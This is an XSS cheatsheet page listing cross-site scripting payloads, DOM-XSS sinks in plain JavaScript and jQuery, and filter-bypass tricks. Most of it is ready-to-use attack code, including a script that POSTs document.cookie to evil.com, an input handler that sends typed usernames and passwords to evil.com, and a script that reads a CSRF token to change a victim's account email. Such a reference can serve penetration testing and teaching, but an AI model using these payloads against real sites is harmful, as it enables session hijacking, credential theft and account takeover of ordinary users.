---
title: XSS - Cross Site Scripting
description: XSS cheatsheets, payloads and tricks.
ignore_macros: true
---

# XSS

## Attack

### Payloads

```html
<sCRipT>alert()</scRipt>
<a href="javascript:alert()"></a>
<img src=x onerror="alert()">

<svg><animatetransform onbegin=alert(1)>

<iframe src='https://example.com/?search="><body onresize=print()>' onload=this.style.width='100px'>

domain.com/?search=<div id=anchor onfocus=alert(document.cookie) tabindex=1>#anchor
```

More payloads on [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).

### HTML events and tags

Lists :

- [all-html-events.txt](/assets/txt/all-html-events.txt)
- [all-html-tags.txt](/assets/txt/all-html-tags.txt)

> Source [www.w3schools.com - event](https://www.w3schools.com/tags/ref_eventattributes.asp) and [www.w3schools.com - tags](https://www.w3schools.com/TAGs/).

### DOM XSS

The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:

```
document.write()  
document.writeln()  
document.domain  
element.innerHTML  
element.outerHTML  
element.insertAdjacentHTML  
element.onevent  
```

The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:

```
add()  
after()  
append()  
animate()  
insertAfter()  
insertBefore()  
before()  
html()  
prepend()  
replaceAll()  
replaceWith()  
wrap()  
wrapInner()  
wrapAll()  
has()  
constructor()  
init()  
index()  
jQuery.parseHTML()  
$.parseHTML()
```

> Source [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/dom-based).

## Bypass

### Replace function

The `replace` function only replace the first occurence.

```js
> "<img src=x onerror='alert()'>".replace("<", "&lt;")
"&lt;img src=x onerror='alert()'>"


> "<<img src=x onerror='alert()'>".replace("<", "&lt;")
"&lt;<img src=x onerror='alert()'>"
```

### jQuery's $() selector

- `<iframe src="https://example.com/" onload="this.src+='<img src=x onerror=print()>'"></iframe>`

### AngularJS ng-app

- `{{$on.constructor('alert(1)')()}}`

### Send cookie via POST request

```html
<script>
fetch('https://evil.com',{method:'POST',mode:'no-cors',body:document.cookie});
</script>
```

### Capture passwords (keylogger)

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length) fetch('https://evil.com',{method:'POST',mode: 'no-cors',body:username.value+':'+this.value});">
```

### URL Reflection + Bind Key

`/?%27accesskey=%27x%27onclick=%27alert()`, then `Alt+x` on Brave

### HTML entity escape

- `http://example&apos;,alert(),&apos;` => `('http://example',alert(),'...')'`

### Change CSRF

```html
<script>
let req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('GET', '/my-account', true);
req.send();

function handleResponse() {
    let csrfToken = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    fetch("/my-account/change-email", {
        "body": "email=toto@toto.com&csrf=" + csrfToken,
        "method": "POST"
    });
};
</script>
```

### Escape 

`'` and `\`

```html
</script><script>alert()</script>
```

`'` with `<` filtered

```html
\';alert()//
&apos;-alert(1)-&apos;
```

XSS inside backticks

```html
${alert(document.domain)}
```